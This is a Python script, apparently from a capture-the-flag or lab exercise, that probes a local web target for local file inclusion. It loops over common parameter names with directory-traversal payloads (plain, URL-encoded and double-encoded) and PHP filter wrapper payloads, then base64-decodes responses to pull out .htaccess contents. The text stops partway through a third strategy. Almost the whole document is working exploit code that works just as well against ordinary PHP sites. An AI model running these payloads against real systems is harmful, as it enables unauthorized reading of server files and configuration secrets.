import requests
import urllib.parse
import base64

# Configure session with proper headers and timeout
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive'
})

timeout = 15  # Increased timeout
target = "http://127.0.0.1:33154/"

print("SYSTEMATIC LFI TESTING - COMPREHENSIVE ATTEMPT")
print("="*80)

# Test Strategy 1: Direct access attempts
print("\n[STRATEGY 1] Direct .htaccess file access")
print("-"*80)

# Common parameters that might be vulnerable
parameters = ["page", "file", "view", "config", "path", "include", "load", "read", "open", "dir", "folder"]

for param in parameters:
    print(f"\nTesting parameter: {param}")
    
    payloads = [
        ".htaccess",  # Direct
        "./.htaccess",  # Current dir
        "../.htaccess",  # Parent
        "../../.htaccess",
        "../../../.htaccess",
        "../../../../.htaccess",
        "../../../../../.htaccess",
        "..%2f.htaccess",  # URL encoded ../
        "..%2f..%2f.htaccess",
        "..%2f..%2f..%2f.htaccess",
        "..%252f.htaccess",  # Double encoded
        "..%252f..%252f.htaccess"
    ]
    
    for payload in payloads:
        try:
            url = f"{target}?{param}={payload}"
            response = session.get(url, timeout=timeout, allow_redirects=False)
            
            # Check if response looks like a config file
            htaccess_indicators = [
                "RewriteEngine", "RewriteCond", "RewriteRule",
                "AllowOverride", "Options", "Order", "Deny", "Require",
                "<Files", "<Directory", "SetEnv", "php_flag",
                "# BEGIN", "# END", "#", "<IfModule"
            ]
            
            found_indicators = []
            if response.text:
                for indicator in htaccess_indicators:
                    if indicator in response.text:
                        found_indicators.append(indicator)
            
            if found_indicators:
                print(f"\n[✓ SUCCESS] {param}={payload}")
                print(f"  Status: {response.status_code}")
                print(f"  Found: {found_indicators[:3]}")  # Show first 3
                print(f"  Preview:\n{response.text[:500]}")
            elif response.status_code == 200:
                # Some response returned, check content
                if len(response.text) > 0 and "error" not in response.text.lower():
                    print(f"\n[? PARTIAL] {param}={payload}")
                    print(f"  Status: 200 | Length: {len(response.text)}B")
                    print(f"  Preview: {response.text[:200]}")
                    
        except Exception as e:
            continue

# Test Strategy 2: PHP filter wrapper approach
print("\n" + "="*80)
print("[STRATEGY 2] PHP filter wrapper approach")
print("-"*80)

filter_payloads = [
    "php://filter/convert.base64-encode/resource=.htaccess",
    "php://filter/read=convert.base64-encode/resource=.htaccess",
    "php://filter/resource=.htaccess",
    "php://filter/convert.base64-encode/resource=./.htaccess",
    "php://filter/convert.base64-encode/resource=../.htaccess",
    "php://filter/convert.base64-encode/resource=../../../.htaccess",
    "php://filter/convert.base64-encode/resource=../../../../.htaccess"
]

for param in parameters:
    for filter_payload in filter_payloads:
        try:
            url = f"{target}?{param}={filter_payload}"
            response = session.get(url, timeout=timeout, allow_redirects=False)
            
            # Look for base64 encoded content
            if response.text:
                import re
                # Base64 pattern (minimum 50 chars, alphanumeric and +/=)
                base64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
                matches = re.findall(base64_pattern, response.text)
                
                for match in matches[:2]:  # Check first 2 matches
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if any(x in decoded for x in ["RewriteEngine", "SetEnv", "AllowOverride", "<Files"]):
                            print(f"\n[✓ BASE64 DECODED .htaccess] {param}")
                            print(f"  Payload: {filter_payload}")
                            print(f"  Status: {response.status_code}")
                            print(f"  DECODED CONTENT:\n{decoded}")
                    except:
                        pass
                        
        except Exception as e:
            continue

# Test Strategy 3: Configuration file enumeration
print("\n" + "="*80)
